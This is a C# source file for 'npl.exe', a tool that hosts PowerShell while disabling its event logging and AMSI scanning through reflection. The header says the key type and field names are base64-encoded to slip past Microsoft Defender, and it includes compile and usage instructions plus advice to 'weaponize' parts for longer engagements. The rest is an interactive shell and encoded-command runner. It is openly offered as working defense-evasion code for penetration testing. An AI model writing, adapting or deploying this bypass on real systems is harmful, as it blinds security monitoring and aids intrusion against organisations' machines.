using System;
using System.IO;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Reflection;
using System.Text;
using System.Linq;
using System.Globalization;
using System.Collections.Generic;

/*
Author: Reigning Shells

Derived From: https://github.com/Ben0xA/nps
              https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs

This is npl.exe or No PowerShell Logging.  Completely derived from others' work, 
just a way to illustrate how to entirely bypass PowerShell logging and AMSI.  
This is not intended to be used as is on anything other than a simple one-off 
penetration test.  For a real, long term, engagement only the necessary functionality
should be extracted from this and weaponized.

This npl.cs with simple obfuscation of strings to bypass Defender's checks for AMSI and
PowerShell logging bypasses.  It seriously only takes base64 encoding the strings but,
without it, will trigger an alert at compile time or when npl.exe is dropped to disk.

How to compile:
===============
c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll /out:npl.exe npl-obfuscated.cs

How to use:
============
npl.exe -shell
npl.exe "{powershell single command}"
npl.exe "& {commands; semi-colon; separated}"
npl.exe -encodedcommand {base64_encoded_command}
npl.exe -encode "commands to encode to base64"
npl.exe -decode {base64_encoded_command}
*/

namespace npl
{
    class Program
    {
        static void Main(string[] args)
        {

            PowerShell ps = PowerShell.Create();

            // Disable Logging
            String myType = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByAA=="));
            String myField = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("ZQB0AHcAUAByAG8AdgBpAGQAZQByAA=="));
            var x = ps.GetType().Assembly.GetType(myType);
            if (x != null)
            {
                var y = x.GetField(myField, BindingFlags.NonPublic | BindingFlags.Static);
                var z = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                y.SetValue(null, z);
            }

            // Disable AMSI
            myType = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="));
            myField = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="));
            x = ps.GetType().Assembly.GetType(myType);
            if (x != null)
            {
                x.GetField(myField, BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            }

            if (args.Length >= 1)
            {
                if (args[0].ToLower() == "-encode")
                {
                    if (args.Length == 2)
                    {
                        Byte[] bytes = System.Text.Encoding.Unicode.GetBytes(args[1]);
                        Console.WriteLine(System.Convert.ToBase64String(bytes));
                    }
                    else
                    {
                        Console.WriteLine("usage: npl.exe -encode \"& commands; separated; by; semicolons;\"");
                    }
                }
                else if (args[0].ToLower() == "-decode")
                {
                    if (args.Length == 2)
                    {
                        String cmd = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(args[1]));
                        Console.WriteLine(cmd);
                    }
                    else
                    {
                        Console.WriteLine("usage: npl.exe -decode {base_64_string}");
                    }
                }
                else if (args[0].ToLower() == "-shell")
                {
                    while (true)
                    {
                        ps.AddScript("pwd");
                        string pwd = ps.Invoke()[0].ToString();
                        string prompt = "PS " + pwd + "> ";

                        string input = TabableReadLine(ps, prompt, pwd);

                        if (string.IsNullOrEmpty(input))
                        {
                            continue;
                        }

                        if (input.ToLower() == "exit")
                        {
                            break;
                        }

                        Invoke(ps, input);
                        ps.Commands.Clear();
                    }
                }
                else
                {
                    if (args[0].ToLower() == "-encodedcommand" || args[0].ToLower() == "-enc")
                    {
                        String script = "";
                        for (int argidx = 1; argidx < args.Length; argidx++)
                        {
                            script += System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(args[argidx]));
                        }
                        Invoke(ps, script);
                    }
                    else
                    {
                        String script = "";
                        for (int argidx = 0; argidx < args.Length; argidx++)
                        {
                            script += @args[argidx];
                        }
                        Invoke(ps, script);
                    }

                }
            }
            else
            {
                Console.WriteLine("\r\nusage:\r\nnpl.exe -shell\r\nnpl.exe \"{powershell single command}\"\r\nnpl.exe \"& {commands; semi-colon; separated}\"\r\nnpl.exe -encodedcommand {base64_encoded_command}\r\nnpl.exe -encode \"commands to encode to base64\"\r\nnpl.exe -decode {base64_encoded_command}");
            }
        }
 
        private static string TabableReadLine(PowerShell ps, string prompt, string pwd)
        {
            Console.Write(prompt);
            var builder = new StringBuilder();
            var input = Console.ReadKey(intercept: true);

            while (input.Key != ConsoleKey.Enter)
            {
                var currentInput = builder.ToString();

                switch (input.Key)
                {
                    case ConsoleKey.Tab:
                      
                        var currentParams = currentInput.Split(' ');
                        string currentParam = currentParams[currentParams.Length - 1];

                        // Get matching PowerShell cmdlets
                        ps.AddScript("Get-Command -name \"" + currentParam + "*\" | Select name | Out-String");
                        PSObject output = ps.Invoke()[0];
                        string[] names = Array.FindAll(output.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None), x => x.StartsWith(currentParam));

                        // Get matching files in current directory
                        var data = Directory.EnumerateFileSystemEntries(pwd, "*").Select(Path.GetFileName);
                        var matches = data.Where(item => item != currentParam && item.StartsWith(currentParam, true, CultureInfo.InvariantCulture));

                        matches = names.Concat(matches);
                        if (matches != null && matches.Any())
                        {
                            if (matches.Count() == 1)
                            {
                                currentParams[currentParams.Length - 1] = matches.First();
                            }
                            else
                            {
                                Console.WriteLine("");
                                foreach (string match in matches)
                                {
                                    Console.WriteLine(match);
                                }
                            }
                        }
                        else
                        {
                            input = Console.ReadKey(intercept: true);
                            continue;
                        }

                        ClearCurrentLine(prompt);
                        builder.Clear();

                        string currentCmd = string.Join(" ", currentParams, 0, currentParams.Length);

                        Console.Write(currentCmd);
                        builder.Append(currentCmd);
                        break;
                    case ConsoleKey.Backspace:
                        if (currentInput.Length > 0)
                        {
                            builder.Remove(builder.Length - 1, 1);
                            ClearCurrentLine(prompt);

                            currentInput = currentInput.Any() ? currentInput.Remove(currentInput.Length - 1, 1) : string.Empty;
                            Console.Write(currentInput);
                        }
                        else
                        {
                            ClearCurrentLine(prompt);
                        }
                        break;
                    case ConsoleKey.LeftArrow:
                        builder.Remove(builder.Length - 1, 1);
                        Console.SetCursorPosition(prompt.Length + currentInput.Length - 1, Console.CursorTop);
                        break;
                    default:
                        var key = input.KeyChar;
                        builder.Append(key);
                        Console.Write(key);
                        break;
                }

                input = Console.ReadKey(intercept: true);
            }
            Console.WriteLine(input.KeyChar);
            return builder.ToString();
        }

        private static void ClearCurrentLine(string currentPrompt)
        {
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.Write(currentPrompt.PadRight(Console.WindowWidth - currentPrompt.Length, ' '));
            Console.SetCursorPosition(currentPrompt.Length, Console.CursorTop);
        }

        private static void Invoke(PowerShell ps, string input)
        {
            string script = input + " 2>&1 | Out-String";
            ps.AddScript(script);
            Collection<PSObject> output = null;

            try
            {
                output = ps.Invoke();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error while executing the script.\r\n" + e.Message.ToString());
            }
            if (output != null && output.Count > 0)
            {
                string[] lines = output[0].ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                foreach (string line in lines)
                {
                        Console.WriteLine(line.TrimEnd());
                }
            }
        }
    }
}